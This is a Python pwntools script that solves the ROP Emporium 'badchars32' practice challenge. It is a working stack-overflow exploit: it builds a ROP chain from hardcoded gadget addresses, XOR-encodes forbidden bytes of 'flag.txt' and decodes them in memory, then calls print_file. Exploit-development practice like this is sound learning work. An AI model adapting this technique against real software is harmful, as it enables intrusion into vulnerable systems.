#!/usr/bin/env python3
# Solution to ROP Emporium badchars32
from pwn import *   # import pwntools

context.log_level = "debug"   # Debugging information
context.binary = elf = ELF("./badchars32")    # Set architecture info
io = process()    # Create a process with the loaded elf
rop = ROP(elf)    # Create the ROP object
# gdb.attach(io)

offset = 44
xor_value = p32(0x1)

data_section = elf.symbols.data_start
# 0x080485b9: pop esi; pop edi; pop ebp; ret;
pop_pop_pop_ret = p32(0x080485b9)
# 0x0804839d: pop ebx; ret; 
pop_ebx = p32(0x0804839d)
# 0x080485bb: pop ebp; ret;
pop_ebp = p32(0x080485bb)
# 0x0804854f: mov dword ptr [edi], esi; ret; 
mov_ret = p32(0x0804854f)
# 0x08048547: xor byte ptr [ebp], bl; ret; 
xor_byte = p32(0x08048547)

# Bad chars: "x" "g" "a" "."
# Bad chars in hex: 78 67 61 2e
# flag.txt
# Bad char offsets: 2,3,4,6

# Setup xor value
rop.raw([pop_ebx, xor_value])
# Store flag with xor'd bad bytes
rop.raw([pop_pop_pop_ret, "fl\x60\x66", data_section, "BBBB", mov_ret])
# store .txt with xor'd bad bytes and set addr for first xor
rop.raw([pop_pop_pop_ret, "\x2ft\x79t", data_section + 0x4, data_section + 0x2, mov_ret])
# xor first value
rop.raw([xor_byte])
# Set second value and xor
rop.raw([pop_ebp, data_section + 0x3, xor_byte])
# Set third value and xor
rop.raw([pop_ebp, data_section + 0x4, xor_byte])
# Set fourth value and xor
rop.raw([pop_ebp, data_section + 0x6, xor_byte]) 
# Call print_file()
rop.print_file(data_section)
rop_chain = rop.chain()

payload = b""
payload += b"B" * offset
payload += rop_chain

write("payload.txt", payload)

io.recvuntil(b"> ")
io.sendline(payload)
io.recvuntil(b"Thank you!\n")
success(io.recv())
